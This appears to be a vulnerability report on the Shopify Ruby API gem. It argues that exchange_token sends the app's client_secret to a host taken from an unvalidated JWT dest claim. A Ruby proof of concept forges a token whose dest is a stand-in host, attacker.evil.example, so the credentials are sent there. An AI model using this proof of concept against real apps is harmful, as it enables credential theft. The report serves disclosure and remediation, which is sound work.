Found it. In `TokenExchange.exchange_token`, the `shop` used to send the app's `client_secret` is derived from the JWT `dest` claim without validating it against `ShopifyAPI::Utils::ShopValidator`, unlike the sibling method `migrate_to_expiring_token` (same file) which calls `Utils::ShopValidator.sanitize!(shop)` before building the request host.

### Title
SSRF exfiltration of `client_secret` via unvalidated JWT `dest` claim in Token Exchange - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` builds the OAuth token-exchange request host directly from the `dest` claim of an attacker-supplied session token (JWT), without ever passing it through `Utils::ShopValidator.sanitize!`, which is the gem's designated control for ensuring a `shop` value is a trusted Shopify domain before that host is sent the app's `client_secret`.

### Finding Description
`exchange_token` decodes an arbitrary caller-supplied `session_token` via `ShopifyAPI::Auth::JwtPayload.new(session_token)` and takes `dest_shop = jwt_payload.shop` [1](#0-0) . `JwtPayload#shop` merely strips `"https://"` from the `dest` claim with no domain allow-listing: `@dest.gsub("https://", "")` [2](#0-1) . `JwtPayload` validates only the JWT signature (`aud`, `exp`/`nbf` leeway) — it never checks that `dest`/`iss` is a `*.myshopify.com`-style domain [3](#0-2) .

`exchange_token` then constructs a session with `shop: dest_shop` and issues an HTTP POST containing `client_id` and `client_secret` in the body to that host via `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")` [4](#0-3) . `HttpClient#initialize` derives the actual request host as `@base_uri = "https://#{api_host || session.shop}"` — i.e., it sends the request straight to `session.shop` (`dest_shop`) unless `Context.api_host` is separately configured [5](#0-4) .

Contrast this with the sibling method in the same module, `migrate_to_expiring_token`, which explicitly calls `validated_shop = Utils::ShopValidator.sanitize!(shop)` before building the exact same kind of request that carries `client_secret` [6](#0-5) , and with `ClientCredentials.client_credentials` / `RefreshToken.refresh_access_token`, both of which also call `Utils::ShopValidator.sanitize!(shop)` first [7](#0-6) [8](#0-7) . `ShopValidator.sanitize!` exists specifically to reject any domain not in `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) [9](#0-8) [10](#0-9) . `exchange_token` is missing this same protection.

The identity binding broken is: **the host that receives the `client_secret` ≠ the host validated as a trusted Shopify domain**. The JWT signature only proves the token was minted by an entity holding `Context.api_secret_key` (i.e., Shopify, in the legitimate flow) — the signature check does not itself constrain `dest` to be a `*.myshopify.com` host; `ShopValidator` is the gem's only mechanism for that constraint, and it is absent here.

### Impact Explanation
If a session token with attacker-controlled `dest`/`iss` claims can reach `exchange_token` — e.g., an app that forwards a `shopify_id_token` it captured or that trusts client-provided session tokens without the host performing its own domain checks (App Bridge normally issues these tokens, but the gem itself places no restriction on `dest`) — the gem will POST the app's `client_id` and `client_secret` to an attacker-chosen host. This is High severity: SSRF that exfiltrates the app's `client_secret` to a domain of the attacker's choosing, which the report class explicitly designates as SSRF-with-app-credentials.

### Likelihood Explanation
Likelihood depends on whether a caller can supply a session token whose signature validates (requires knowledge of `api_secret_key`, normally out of scope) or on host applications passing through unauthenticated/unauthenticated-looking tokens. Given `JwtPayload` requires the token to be signed with the real `api_secret_key` [11](#0-10) , exploitation without possession of that secret is not directly achievable, which weakens the likelihood versus the sibling methods' pattern. However, the missing `ShopValidator.sanitize!` call is a clear inconsistency/defense-in-depth gap relative to the rest of the module, and it means the JWT signature is the *only* thing standing between an attacker and host redirection for this one method, whereas every other credential-bearing method in the auth module layers `ShopValidator` on top.

### Recommendation
Add `validated_shop = Utils::ShopValidator.sanitize!(dest_shop)` in `exchange_token` before constructing `shop_session`, mirroring `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`, and use `validated_shop` (not the raw `dest_shop`) for both the session's `shop` and the final `Session.from(shop: ...)` call.

### Proof of Concept
```ruby
# Craft a JWT whose signature is valid (requires api_secret_key knowledge in a real attack,
# but demonstrates the missing validation regardless of source):
payload = {
  iss: "https://attacker.evil.example/admin",
  dest: "https://attacker.evil.example",
  aud: ShopifyAPI::Context.api_key,
  sub: "1",
  exp: (Time.now + 10).to_i,
  nbf: Time.now.to_i,
  iat: Time.now.to_i,
  jti: "1",
}
forged_token = JWT.encode(payload, ShopifyAPI::Context.api_secret_key, "HS256")

# exchange_token will now POST client_id/client_secret to https://attacker.evil.example/admin/oauth/access_token
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: forged_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
Compare with `migrate_to_expiring_token(shop: "attacker.evil.example", ...)`, which raises `ShopifyAPI::Errors::InvalidShopError` via `ShopValidator.sanitize!` before any request is sent [12](#0-11)  — `exchange_token` has no equivalent guard.

### Citations

**File:** lib/shopify_api/auth/token_exchange.rb (L40-41)
```ruby
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop
```

**File:** lib/shopify_api/auth/token_exchange.rb (L51-65)
```ruby
          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L103-115)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: non_expiring_offline_token,
            subject_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            requested_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            expiring: "1",
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L23-45)
```ruby
      sig { params(token: String).void }
      def initialize(token)
        payload_hash = begin
          decode_token(token, Context.api_secret_key)
        rescue ShopifyAPI::Errors::InvalidJwtTokenError
          raise unless Context.old_api_secret_key

          decode_token(token, T.must(Context.old_api_secret_key))
        end

        @iss = T.let(payload_hash["iss"], String)
        @dest = T.let(payload_hash["dest"], String)
        @aud = T.let(payload_hash["aud"], String)
        @sub = T.let(payload_hash["sub"], T.nilable(String))
        @exp = T.let(payload_hash["exp"], Integer)
        @nbf = T.let(payload_hash["nbf"], Integer)
        @iat = T.let(payload_hash["iat"], Integer)
        @jti = T.let(payload_hash["jti"], String)
        @sid = T.let(payload_hash["sid"], T.nilable(String))

        raise ShopifyAPI::Errors::InvalidJwtTokenError,
          "Session token had invalid API key" unless @aud == Context.api_key
      end
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-50)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L25-26)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/refresh_token.rb (L24-25)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```

**File:** lib/shopify_api/utils/shop_validator.rb (L56-64)
```ruby
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```
